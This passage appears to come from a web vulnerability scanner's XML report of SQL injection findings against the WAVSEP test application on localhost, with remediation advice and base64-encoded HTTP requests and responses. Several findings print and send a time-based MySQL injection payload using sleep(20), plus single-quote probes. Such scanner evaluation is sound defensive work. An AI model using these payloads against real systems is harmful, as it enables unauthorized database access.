    <issueDetail><![CDATA[The <b>msg</b> parameter appears to be vulnerable to SQL injection attacks. A single quote was submitted in the msg parameter, and a database error message was returned. Two single quotes were then submitted and the error message disappeared. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>' and (select*from(select(sleep(20)))a)-- </b> was submitted in the msg parameter. The application took <b>20002</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <remediationDetail><![CDATA[The application should handle errors gracefully and prevent SQL error messages from being returned in responses. ]]></remediationDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtR0VUL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLUdFVC1VbmlvbkV4cGxvaXQvQ2FzZTA0LUluamVjdGlvbkluU2VhcmNoLUxpc3RpbmdEYXRhYmFzZUNvbnRlbnRzLVVuaW9uRXhwbG9pdC5qc3A/bXNnPXRleHR2YWx1ZScgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLU5ldy1DYXNlcy1HRVQvU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtR0VULVVuaW9uRXhwbG9pdC9pbmRleC5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD1FNDRBQTU2M0M0RUJFNDBENzI2ODk5NjU1QjYwQUIxMA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgNTAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxhbmd1YWdlOiBlbg0KQ29udGVudC1MZW5ndGg6IDkwNA0KRGF0ZTogVHVlLCAyMyBBcHIgMjAyNCAwODo1NzozOSBHTVQNCkNvbm5lY3Rpb246IGNsb3NlDQoNCjwhZG9jdHlwZSBodG1sPjxodG1sIGxhbmc9ImVuIj48aGVhZD48dGl0bGU+SFRUUCBTdGF0dXMgNTAwID8gSW50ZXJuYWwgU2VydmVyIEVycm9yPC90aXRsZT48c3R5bGUgdHlwZT0idGV4dC9jc3MiPmJvZHkge2ZvbnQtZmFtaWx5OlRhaG9tYSxBcmlhbCxzYW5zLXNlcmlmO30gaDEsIGgyLCBoMywgYiB7Y29sb3I6d2hpdGU7YmFja2dyb3VuZC1jb2xvcjojNTI1RDc2O30gaDEge2ZvbnQtc2l6ZToyMnB4O30gaDIge2ZvbnQtc2l6ZToxNnB4O30gaDMge2ZvbnQtc2l6ZToxNHB4O30gcCB7Zm9udC1zaXplOjEycHg7fSBhIHtjb2xvcjpibGFjazt9IC5saW5lIHtoZWlnaHQ6MXB4O2JhY2tncm91bmQtY29sb3I6IzUyNUQ3Njtib3JkZXI6bm9uZTt9PC9zdHlsZT48L2hlYWQ+PGJvZHk+PGgxPkhUVFAgU3RhdHVzIDUwMCA/IEludGVybmFsIFNlcnZlciBFcnJvcjwvaDE+PGhyIGNsYXNzPSJsaW5lIiAvPjxwPjxiPlR5cGU8L2I+IFN0YXR1cyBSZXBvcnQ8L3A+PHA+PGI+TWVzc2FnZTwvYj4gRXhjZXB0aW9uIGRldGFpbHM6IGphdmEuc3FsLlNRTFN5bnRheEVycm9yRXhjZXB0aW9uOiBZb3UgaGF2ZSBhbiBlcnJvciBpbiB5b3VyIFNRTCBzeW50YXg7IGNoZWNrIHRoZSBtYW51YWwgdGhhdCBjb3JyZXNwb25kcyB0byB5b3VyIE15U1FMIHNlcnZlciB2ZXJzaW9uIGZvciB0aGUgcmlnaHQgc3ludGF4IHRvIHVzZSBuZWFyICYjMzk7JSYjMzk7JiMzOTsgYXQgbGluZSAxPC9wPjxwPjxiPkRlc2NyaXB0aW9uPC9iPiBUaGUgc2VydmVyIGVuY291bnRlcmVkIGFuIHVuZXhwZWN0ZWQgY29uZGl0aW9uIHRoYXQgcHJldmVudGVkIGl0IGZyb20gZnVsZmlsbGluZyB0aGUgcmVxdWVzdC48L3A+PGhyIGNsYXNzPSJsaW5lIiAvPjxoMz5BcGFjaGUgVG9tY2F0LzguNS44NDwvaDM+PC9ib2R5PjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtR0VUL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLUdFVC1VbmlvbkV4cGxvaXQvQ2FzZTA0LUluamVjdGlvbkluU2VhcmNoLUxpc3RpbmdEYXRhYmFzZUNvbnRlbnRzLVVuaW9uRXhwbG9pdC5qc3A/bXNnPXRleHR2YWx1ZScnIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtR0VUL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLUdFVC1VbmlvbkV4cGxvaXQvaW5kZXguanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9RTQ0QUE1NjNDNEVCRTQwRDcyNjg5OTY1NUI2MEFCMTANClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU3OjM5IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA0NzcNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDQgLSBJbmplY3Rpb24gaW50byBHRVQgcGFyYW1ldGVyIGluIGEgcGFnZSB3aXRoIGVycm9uZW91cyByZXNwb25zZXMuIEdvYWw6IExpc3RpbmcgZGF0YWJhc2UgY29udGVudHM8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKVGhlIGxpc3Qgb2YgbWVzc2FnZXM6CjxUQUJMRT4KPFRSPgo8VEQ+CjxCPgpNc2dJZAo8L0I+CjwvVEQ+CjxURD4KPEI+ClRpdGxlCjwvQj4KPC9URD4KPFREPgo8Qj4KTWVzc2FnZQo8L0I+CjwvVEQ+CjwvVFI+CjwvVEFCTEU+CgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtR0VUL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLUdFVC1VbmlvbkV4cGxvaXQvQ2FzZTA0LUluamVjdGlvbkluU2VhcmNoLUxpc3RpbmdEYXRhYmFzZUNvbnRlbnRzLVVuaW9uRXhwbG9pdC5qc3A/bXNnPXRleHR2YWx1ZSclMjBhbmQlMjAoc2VsZWN0KmZyb20oc2VsZWN0KHNsZWVwKDIwKSkpYSktLSUyMCBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLUdFVC9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLU5ldy1DYXNlcy1HRVQtVW5pb25FeHBsb2l0L2luZGV4LmpzcA0KQ29va2llOiBKU0VTU0lPTklEPUU0NEFBNTYzQzRFQkU0MEQ3MjY4OTk2NTVCNjBBQjEwDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU4OjAwIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA0NzcNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDQgLSBJbmplY3Rpb24gaW50byBHRVQgcGFyYW1ldGVyIGluIGEgcGFnZSB3aXRoIGVycm9uZW91cyByZXNwb25zZXMuIEdvYWw6IExpc3RpbmcgZGF0YWJhc2UgY29udGVudHM8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKVGhlIGxpc3Qgb2YgbWVzc2FnZXM6CjxUQUJMRT4KPFRSPgo8VEQ+CjxCPgpNc2dJZAo8L0I+CjwvVEQ+CjxURD4KPEI+ClRpdGxlCjwvQj4KPC9URD4KPFREPgo8Qj4KTWVzc2FnZQo8L0I+CjwvVEQ+CjwvVFI+CjwvVEFCTEU+CgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>2047827168650719232</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-New-Cases-GET/SInjection-Detection-Evaluation-New-Cases-GET-UnionExploit/Case05-InjectionInSearch-ListingDatabaseTableColumns-UnionExploit.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-New-Cases-GET/SInjection-Detection-Evaluation-New-Cases-GET-UnionExploit/Case05-InjectionInSearch-ListingDatabaseTableColumns-UnionExploit.jsp [msg parameter]]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>msg</b> parameter appears to be vulnerable to SQL injection attacks. A single quote was submitted in the msg parameter, and a database error message was returned. Two single quotes were then submitted and the error message disappeared. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>' and (select*from(select(sleep(20)))a)-- </b> was submitted in the msg parameter. The application took <b>20004</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <remediationDetail><![CDATA[The application should handle errors gracefully and prevent SQL error messages from being returned in responses. ]]></remediationDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtR0VUL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLUdFVC1VbmlvbkV4cGxvaXQvQ2FzZTA1LUluamVjdGlvbkluU2VhcmNoLUxpc3RpbmdEYXRhYmFzZVRhYmxlQ29sdW1ucy1VbmlvbkV4cGxvaXQuanNwP21zZz10ZXh0dmFsdWUnIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtR0VUL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLUdFVC1VbmlvbkV4cGxvaXQvaW5kZXguanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9RTQ0QUE1NjNDNEVCRTQwRDcyNjg5OTY1NUI2MEFCMTANClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgNTAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxhbmd1YWdlOiBlbg0KQ29udGVudC1MZW5ndGg6IDkwNA0KRGF0ZTogVHVlLCAyMyBBcHIgMjAyNCAwODo1Nzo0MiBHTVQNCkNvbm5lY3Rpb246IGNsb3NlDQoNCjwhZG9jdHlwZSBodG1sPjxodG1sIGxhbmc9ImVuIj48aGVhZD48dGl0bGU+SFRUUCBTdGF0dXMgNTAwID8gSW50ZXJuYWwgU2VydmVyIEVycm9yPC90aXRsZT48c3R5bGUgdHlwZT0idGV4dC9jc3MiPmJvZHkge2ZvbnQtZmFtaWx5OlRhaG9tYSxBcmlhbCxzYW5zLXNlcmlmO30gaDEsIGgyLCBoMywgYiB7Y29sb3I6d2hpdGU7YmFja2dyb3VuZC1jb2xvcjojNTI1RDc2O30gaDEge2ZvbnQtc2l6ZToyMnB4O30gaDIge2ZvbnQtc2l6ZToxNnB4O30gaDMge2ZvbnQtc2l6ZToxNHB4O30gcCB7Zm9udC1zaXplOjEycHg7fSBhIHtjb2xvcjpibGFjazt9IC5saW5lIHtoZWlnaHQ6MXB4O2JhY2tncm91bmQtY29sb3I6IzUyNUQ3Njtib3JkZXI6bm9uZTt9PC9zdHlsZT48L2hlYWQ+PGJvZHk+PGgxPkhUVFAgU3RhdHVzIDUwMCA/IEludGVybmFsIFNlcnZlciBFcnJvcjwvaDE+PGhyIGNsYXNzPSJsaW5lIiAvPjxwPjxiPlR5cGU8L2I+IFN0YXR1cyBSZXBvcnQ8L3A+PHA+PGI+TWVzc2FnZTwvYj4gRXhjZXB0aW9uIGRldGFpbHM6IGphdmEuc3FsLlNRTFN5bnRheEVycm9yRXhjZXB0aW9uOiBZb3UgaGF2ZSBhbiBlcnJvciBpbiB5b3VyIFNRTCBzeW50YXg7IGNoZWNrIHRoZSBtYW51YWwgdGhhdCBjb3JyZXNwb25kcyB0byB5b3VyIE15U1FMIHNlcnZlciB2ZXJzaW9uIGZvciB0aGUgcmlnaHQgc3ludGF4IHRvIHVzZSBuZWFyICYjMzk7JSYjMzk7JiMzOTsgYXQgbGluZSAxPC9wPjxwPjxiPkRlc2NyaXB0aW9uPC9iPiBUaGUgc2VydmVyIGVuY291bnRlcmVkIGFuIHVuZXhwZWN0ZWQgY29uZGl0aW9uIHRoYXQgcHJldmVudGVkIGl0IGZyb20gZnVsZmlsbGluZyB0aGUgcmVxdWVzdC48L3A+PGhyIGNsYXNzPSJsaW5lIiAvPjxoMz5BcGFjaGUgVG9tY2F0LzguNS44NDwvaDM+PC9ib2R5PjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtR0VUL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLUdFVC1VbmlvbkV4cGxvaXQvQ2FzZTA1LUluamVjdGlvbkluU2VhcmNoLUxpc3RpbmdEYXRhYmFzZVRhYmxlQ29sdW1ucy1VbmlvbkV4cGxvaXQuanNwP21zZz10ZXh0dmFsdWUnJyBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLUdFVC9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLU5ldy1DYXNlcy1HRVQtVW5pb25FeHBsb2l0L2luZGV4LmpzcA0KQ29va2llOiBKU0VTU0lPTklEPUU0NEFBNTYzQzRFQkU0MEQ3MjY4OTk2NTVCNjBBQjEwDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU3OjQzIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA0ODUNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDUgLSBJbmplY3Rpb24gaW50byBHRVQgcGFyYW1ldGVyIGluIGEgcGFnZSB3aXRoIGVycm9uZW91cyByZXNwb25zZXMuIEdvYWw6IExpc3RpbmcgY29sdW1ucyBvZiB0YWJsZXMgJ3VzZXJzJzwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpUaGUgbGlzdCBvZiBtZXNzYWdlczoKPFRBQkxFPgo8VFI+CjxURD4KPEI+Ck1zZ0lkCjwvQj4KPC9URD4KPFREPgo8Qj4KVGl0bGUKPC9CPgo8L1REPgo8VEQ+CjxCPgpNZXNzYWdlCjwvQj4KPC9URD4KPC9UUj4KPC9UQUJMRT4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtR0VUL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLUdFVC1VbmlvbkV4cGxvaXQvQ2FzZTA1LUluamVjdGlvbkluU2VhcmNoLUxpc3RpbmdEYXRhYmFzZVRhYmxlQ29sdW1ucy1VbmlvbkV4cGxvaXQuanNwP21zZz10ZXh0dmFsdWUnJTIwYW5kJTIwKHNlbGVjdCpmcm9tKHNlbGVjdChzbGVlcCgyMCkpKWEpLS0lMjAgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLU5ldy1DYXNlcy1HRVQvU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtR0VULVVuaW9uRXhwbG9pdC9pbmRleC5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD1FNDRBQTU2M0M0RUJFNDBENzI2ODk5NjU1QjYwQUIxMA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KDQo=]]></request>
